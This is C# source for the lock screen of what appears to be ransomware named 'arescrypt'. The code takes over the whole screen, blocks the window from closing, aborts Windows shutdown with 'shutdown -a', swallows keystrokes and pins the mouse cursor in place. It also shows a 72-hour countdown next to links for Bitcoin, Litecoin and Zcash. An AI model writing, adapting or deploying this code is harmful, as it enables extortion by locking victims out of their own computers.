﻿using System;
using System.Drawing;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace arescrypt
{
    public partial class Display : Form
    {

        [DllImport("user32.dll")]
        static extern void mouse_event(uint dwflag);

        public Display() {
            InitializeComponent();

            if (!Program.sandBox) // == false
            {   // This will maximize the screen, and eliminate the taskbar. 
                this.WindowState = FormWindowState.Maximized;
                this.FormBorderStyle = FormBorderStyle.None;
            }
        }

        private void Display_Load(object sender, EventArgs e) { }

        Point cursorPos = new Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2, Screen.PrimaryScreen.WorkingArea.Height / 2);
        private void timer1_tick(object sender, EventArgs e)
        {
            
            Size size = Screen.PrimaryScreen.Bounds.Size;
            size.Height -= 10; size.Width -= 10;
            this.Size = size; this.Location = new Point(0, 0);
            this.textBox1.Size = new Size(new Point(this.Size.Width / 2 - 12, textBox1.Size.Height));
            textBox1.Location = new Point(this.Size.Width - textBox1.Size.Width - 12, this.Size.Height - textBox1.Size.Height - 12);
            textBox1.Visible = true;
            Cursor.Position = cursorPos;
            mouse_event(0x002 | 0x004);
            
        }

        int timeLeft = 259200;
        private void timer1_Tick(object sender, EventArgs e)
        {
            Console.WriteLine("Seconds left: " + timeLeft--);
        }

        private void preventClose(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            if (e.CloseReason == CloseReason.WindowsShutDown)
                Process.Start("shutdown", "-a");
        }

        private void keyPressAction(object sender, KeyEventArgs e)
        {
            e.SuppressKeyPress = true;
            System.Threading.Thread.Sleep(666);
            Cursor.Position = cursorPos;
            mouse_event(0x002 | 0x004);
        }

        private void RiseTimer_Tick(object sender, EventArgs e) { }

        private void aboutBitcoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        { Process.Start("https://bitcoin.org"); }

        private void aboutLitecoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        { Process.Start("https://litecoin.com/"); }

        private void aboutZcash_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        { Process.Start("https://z.cash/"); }
    }
}